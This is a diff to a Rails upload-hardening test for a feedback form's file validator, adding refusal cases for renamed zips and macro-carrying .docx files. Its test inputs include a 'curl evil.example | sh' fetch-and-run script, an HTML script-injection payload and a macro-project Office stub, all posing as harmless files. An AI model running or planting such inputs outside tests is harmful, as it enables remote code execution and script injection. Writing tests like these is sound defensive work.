@@ -67,7 +67,7 @@ class FeedbackHardeningTest < ActionDispatch::IntegrationTest
     ok = [
       [ File.binread(file_fixture("sample_bottle.png")), "shot.png" ],
       [ "%PDF-1.4\n%fake\n", "menu.pdf" ],
-      [ "PK\x03\x04".b + ("\x00" * 40), "recipe.docx" ],
+      [ File.binread(file_fixture("sample.docx")), "recipe.docx" ],
       [ "item,qty\nflour,2\n", "list.csv" ]
     ]
     ok.each { |bytes, name| assert Feedback.acceptable_file?(StringIO.new(bytes), name), name }
@@ -76,6 +76,9 @@ class FeedbackHardeningTest < ActionDispatch::IntegrationTest
   test "old macro-capable Office formats and binary text are refused" do
     refute Feedback.acceptable_file?(StringIO.new("\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1".b + ("\x00" * 60)), "recipe.doc")
     refute Feedback.acceptable_file?(StringIO.new("item\x00\x01binary".b), "notes.txt")
+    refute Feedback.acceptable_file?(StringIO.new("PK\x03\x04".b + ("\x00" * 40)), "archive.docx"), "any zip renamed .docx"
+    refute Feedback.acceptable_file?(StringIO.new("PK\x03\x04".b + "[Content_Types].xml" + ("\x00" * 20) + "word/vbaProject.bin"), "macro.docx"),
+           "an Office file carrying a macro project"
     refute Feedback.acceptable_file?(StringIO.new("<html><script>alert(1)</script></html>"), "shot.png"), "HTML dressed as a photo"
     refute Feedback.acceptable_file?(StringIO.new("#!/bin/sh\ncurl evil.example | sh\n"), "run.png"), "a script dressed as a photo"
   end
